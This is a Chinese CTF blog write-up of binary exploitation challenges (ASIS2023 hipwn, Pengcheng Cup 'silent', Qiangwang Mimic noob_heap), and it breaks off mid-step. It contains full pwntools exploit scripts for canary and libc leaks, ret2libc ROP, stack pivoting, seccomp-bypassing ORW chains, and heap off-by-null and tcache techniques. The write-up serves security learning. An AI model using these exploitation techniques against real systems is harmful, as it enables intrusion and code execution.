title="ASIS2023-hipwn"></a>ASIS2023-hipwn</h1><p><strong>标签:栈溢出|ret2libc|rop</strong></p><p><strong>题目介绍:</strong>can you pwn??</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> nbytes[<span class="number">72</span>]; <span class="comment">// [rsp+Ch] [rbp-54h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;How much???&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, nbytes);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok... now send content&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;nbytes[<span class="number">4</span>], *(<span class="type">unsigned</span> <span class="type">int</span> *)nbytes);</span><br><span class="line">    nbytes[*(<span class="type">unsigned</span> <span class="type">int</span> *)nbytes + <span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;nbytes[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wanna do it again?&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, nbytes);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)nbytes != <span class="number">0x539</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;i knew it&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checksec,保护全开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/chall&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>很常规的一道<strong>ret2libc</strong>题,但踩了不少坑</p><p>实现如下:</p><ol><li>泄露canary</li><li>泄露程序加载基址</li><li>泄露libc</li><li>rop</li></ol><p>观察一下栈</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-09-23_225025.png" alt=""></p><p>利用main泄露程序加载基址</p><p>利用libc_start_main泄露libc</p><p>常规处理,没有什么特殊的</p><p>最后所有流程都完成但运行无法正常getshell,猜测是栈不对齐,加一个ret即可</p><p><strong>exp:</strong>只适配了远程,但大致是这么个流程</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#from LibcSearcher import*</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">prdi=<span class="number">0x2a3e5</span></span><br><span class="line">p=process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;45.153.243.57&#x27;,1337)</span></span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1024&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line">p.recv()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">p.sendline(<span class="string">b&#x27;1337&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1024&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>)</span><br><span class="line">code=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x11c9</span></span><br><span class="line">puts_got=code+<span class="number">0x3fd0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(code))</span><br><span class="line">p.sendline(<span class="string">b&#x27;1337&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1024&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x80</span>-<span class="number">0x29dc0</span></span><br><span class="line">p.recv()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.sendline(<span class="string">b&#x27;1337&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1024&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(canary)+p64(<span class="number">0x1</span>)+p64(libc_base+prdi)+p64(libc_base+<span class="number">0x1d8698</span>)+p64(code+<span class="number">0x101a</span>)+p64(libc_base+<span class="number">0x050d60</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;133&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#p.sendline(b&#x27;133&#x27;)</span></span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;again?\n&#x27;)</span></span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;again?\n&#x27;)</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#puts_addr=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment">#print(hex(puts_addr))</span></span><br><span class="line"><span class="comment">#libc=puts_addr-0x84ed0</span></span><br><span class="line"><span class="comment">#one=libc+0xeeccc</span></span><br><span class="line"><span class="comment">#p.sendline(b&#x27;1337&#x27;)</span></span><br><span class="line"><span class="comment">#p.sendline(b&#x27;1024&#x27;)</span></span><br></pre></td></tr></table></figure><h2 id="踩的坑"><a href="#踩的坑" class="headerlink" title="踩的坑"></a>踩的坑</h2><p>首先是程序没有给定libc版本,</p><p>然后我运行的环境是ubuntu20,gdb提示需要glibc_234</p><p>当时直接以为程序原本就是glibc234了,但实际上这是最小需求,真正可能libc版本更高</p><p>所以在泄露libc时,就出现了远程<code>__libc_start_main-125</code>并不能找到对应的libc的情况</p><p>即e40-7d=dc3无对应libc,当时压根没想到libc_start_main的函数偏移不同</p><p>脑子短路了一阵</p><p>之后利用更改rbp使得puts泄露got加以确定libc基址才回过神来</p><hr><p><strong>小知识点:</strong></p><p><strong>libc中绝大部分函数地址是十六进制对齐,小部分是八进制对齐,极小部分是其他情况</strong></p><p><strong>因此当计算出的地址不是十六进制或八进制对齐基本可以认为是本地偏移与远程偏移有差</strong></p><p><strong>可以就近对齐十六进制或八进制尝试</strong></p><p>或者泄露其他函数对照</p><h1 id="2023鹏城杯-silent"><a href="#2023鹏城杯-silent" class="headerlink" title="2023鹏城杯-silent"></a>2023鹏城杯-silent</h1><p><strong>标签:栈溢出|ret2text?|rop|栈迁移</strong></p><p><strong>题目介绍:</strong></p><p>程序十分简短</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init_seccomp();</span><br><span class="line">  alarm(<span class="number">0x1E</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启了沙盒</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">aichch@sword-shield:~/pwn$ seccomp-tools dump ./silent</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>禁止execve,只能orw了</p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/silent&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><p>如果不是FULL RELRO可以考虑ret2dl</p><p>只能另作他解了</p><h3 id="解1"><a href="#解1" class="headerlink" title="解1:"></a>解1:</h3><p>解1是比赛时根据找到的一题非常像的题目的思路做的</p><p>简单来说就是栈迁移将栈迁移到bss段,然后调用_<em>libc_start_main去启动一段代码,于是\</em>_libc_start_main会在迁移后的栈上留下read+17的代码地址,在read等系统调用级的代码中一般都会有syscall</p><p>如下所示</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-11-04_221859.png" alt=""></p><p>不过如果用telescope这些查看的方式是找不到syscall的</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-11-04_222054.png" alt=""></p><p>还是得用disassemble或者x去查看查找</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-11-04_222115.png" alt=""></p><p>可以找到这一段,可以视为syscall;ret</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-11-04_221835.png" alt=""></p><p>利用rop流将存储在栈中的read+17改为read+15便可以了</p><p>原理如上</p><p>实际利用过程中,选择采取重启read@plt表,毕竟其也属于代码段,而且刚好能更方便的利用__libc_start_main的参数</p><p>然后在libc_start_main启动read的时候把libc_start_main的返回栈修改为rop流接着进行orw</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./silent&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;172.10.0.8&#x27;,9999)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./silent&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b __libc_start_main&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">r12,r13,r14,r15</span>):</span><br><span class="line">    pay = p64(<span class="number">0x40095A</span>)</span><br><span class="line">    pay += p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">    pay += p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line">    pay += p64(r12) <span class="comment">#call_func</span></span><br><span class="line">    pay += p64(r13) <span class="comment">#edi</span></span><br><span class="line">    pay += p64(r14) <span class="comment">#rsi</span></span><br><span class="line">    pay += p64(r15) <span class="comment">#rdx</span></span><br><span class="line">    pay += p64(<span class="number">0x400940</span>)</span><br><span class="line">    pay += <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"> </span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss = <span class="number">0x601100</span></span><br><span class="line">leave_ret = <span class="number">0x4008FC</span></span><br><span class="line">pop_rbp = <span class="number">0x400788</span></span><br><span class="line">ret=<span class="number">0x4008FD</span></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + csu(read_got,<span class="number">0</span>,bss+<span class="number">0x400</span>,<span class="number">0x580</span>)</span><br><span class="line">pay += p64(pop_rbp) + p64(bss+<span class="number">0x4f8</span>) + p64(leave_ret)</span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x601560</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span>+<span class="string">b&quot;\x00&quot;</span>*<span class="number">0xf0</span>+p64(bss+<span class="number">0x400</span>)</span><br><span class="line">payload +=csu(elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>],read_plt,<span class="number">0</span>,bss+<span class="number">0x478</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload=csu(read_got,<span class="number">0</span>,syscall,<span class="number">1</span>)+csu(read_got,<span class="number">0</span>,bss+<span class="number">0x700</span>,<span class="number">0x2</span>)+ csu(syscall,bss+<span class="number">0x400</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload+=csu(read_got,<span class="number">3</span>,bss+<span class="number">0x420</span>,<span class="number">80</span>)+csu(read_got,<span class="number">0</span>,bss+<span class="number">0x700</span>,<span class="number">1</span>)+csu(syscall,<span class="number">1</span>,bss+<span class="number">0x420</span>,<span class="number">40</span>)<span class="comment">#orw</span></span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;\x2f&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;22&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>不过这种办法只能本地打通,远程似乎因为不是正常退出没有回显,又或者是flag的地址没有设对</p><h3 id="解2"><a href="#解2" class="headerlink" title="解2:"></a>解2:</h3><p>赛后其他人的解法</p><p>用到了一个之前完全没听说过的magic gadget来使得stdout改写为libc中gadget syscall;ret;</p><p>学到了,不过得有__do_global_dtors_aux这个函数才行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:  01 5d c3                add    DWORD PTR [rbp-0x3d],ebx</span><br><span class="line">3:  0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">8:  f3 c3                   repz ret</span><br></pre></td></tr></table></figure><p>然后利用libc_csu_init和read的返回数控制前三个参数和rax的值</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_p</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">global</span> p,elf </span><br><span class="line">    <span class="comment"># p = process(name,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;&#125;)</span></span><br><span class="line">    p = remote(<span class="string">&quot;172.10.0.8&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">    elf = ELF(name)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400963</span></span><br><span class="line">start = <span class="number">0x400720</span></span><br><span class="line">csu_1 = <span class="number">0x00000000040095A</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov     rdx, r15</span></span><br><span class="line"><span class="string">mov     rsi, r14</span></span><br><span class="line"><span class="string">mov     edi, r13d</span></span><br><span class="line"><span class="string">call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8]</span></span><br><span class="line"><span class="string">add     rbx, 1</span></span><br><span class="line"><span class="string">cmp     rbp, rbx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>    </span><br><span class="line">csu_2 = <span class="number">0x000000000400940</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pop     rbx</span></span><br><span class="line"><span class="string">pop     rbp</span></span><br><span class="line"><span class="string">pop     r12</span></span><br><span class="line"><span class="string">pop     r13</span></span><br><span class="line"><span class="string">pop     r14</span></span><br><span class="line"><span class="string">pop     r15</span></span><br><span class="line"><span class="string">retn</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">get_p(<span class="string">&quot;./silent&quot;</span>)</span><br><span class="line">bss = <span class="number">0x602100</span></span><br><span class="line">magic = <span class="number">0x00000000004007e8</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400876</span></span><br><span class="line">stdout = <span class="number">0x000000000601020</span></span><br><span class="line">op = <span class="number">0xffffffffffffffff</span> &amp; (<span class="number">0x00000000000d2625</span>-libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>])</span><br><span class="line">syscall = p64(csu_1) + p64(op) + p64(stdout+<span class="number">0x3d</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(magic)</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x48</span> + p64(csu_1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0</span>) + p64(bss-<span class="number">8</span>) + p64(<span class="number">0x200</span>) + p64(csu_2)</span><br><span class="line">payload += p64(bss-<span class="number">8</span>)*<span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">4</span> + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;/flag\x00\x00\x00&quot;</span> + syscall</span><br><span class="line"></span><br><span class="line">payload += p64(csu_1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0</span>) + p64(bss+<span class="number">0x300</span>) + p64(<span class="number">0x200</span>) + p64(csu_2)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(stdout) + p64(bss-<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(csu_2)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">3</span>) + p64(bss+<span class="number">0x400</span>) + p64(<span class="number">0x200</span>) + p64(csu_2)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0</span>) + p64(bss+<span class="number">0x300</span>) + p64(<span class="number">0x200</span>) + p64(csu_2)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>) + p64(stdout) + p64(<span class="number">1</span>) + p64(bss+<span class="number">0x400</span>) + p64(<span class="number">0x40</span>) + p64(csu_2)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;\x00&quot;</span>*<span class="number">2</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;&quot;)</span></span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line">p.send(<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>只能说不愧是大佬,见多识广有经验</p><h1 id="2023第六届强网拟态-noob-heap"><a href="#2023第六届强网拟态-noob-heap" class="headerlink" title="2023第六届强网拟态- noob_heap"></a>2023第六届强网拟态- noob_heap</h1><p><strong>标签:off-by-null|malloc_consolidate|rop|栈迁移|unlink|tcache attack</strong></p><p><strong>题目介绍:</strong>noob_heap</p><p>checksec</p><figure class="highlight plaintext"><figcaption><span>'/home/aichch/pwn/nb'</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>保护全开,还有沙盒,禁掉了execve,目标是orw</p><p>glibc是2.35,算是高版本了</p><p>程序实现就是老四样:增删查改</p><p>其中edit存在off by null</p><p>让人比较难受的一个点是malloc申请的size只能处于0x20到0x80</p><p>这也就是说chunk正常情况下是不会被放到unsorted中的,而2.32往上的版本的fastbin和tcachebin都是加密过的,也就是说无法泄露堆和libc</p><p>这里就需要用到一个知识点:</p><p><strong>scanf读取数字时发送一个非常长的数字字符串会触发malloc和free</strong>,申请的chunk大小为0x810处于largebin,会触发malloc_consolidate处理fastbin</p><p>那么最终流程如下:</p><ol><li>申请足够的chunk,并释放使其有足够的数量被放入fastbin,这里申请时就要为之后的fake chunk做一些铺垫,提前写上一些东西</li><li>利用sacnf触发malloc_consolidate,使fastbin合并并加入smallbin称为C0</li><li>申请chunk泄露libc和heap</li><li>从合并后的chunk中切出一部分C1,off by null覆盖掉剩余部分的size</li><li>free C1前面的chunk,使得C1进行unlink,并最终造成堆块堆叠</li><li>再将堆叠后的chunk的C1部分取出作为C2,现在可以uaf进行tcache攻击了</li><li>tache attack取出environ符号,获得栈地址</li><li>再tcache 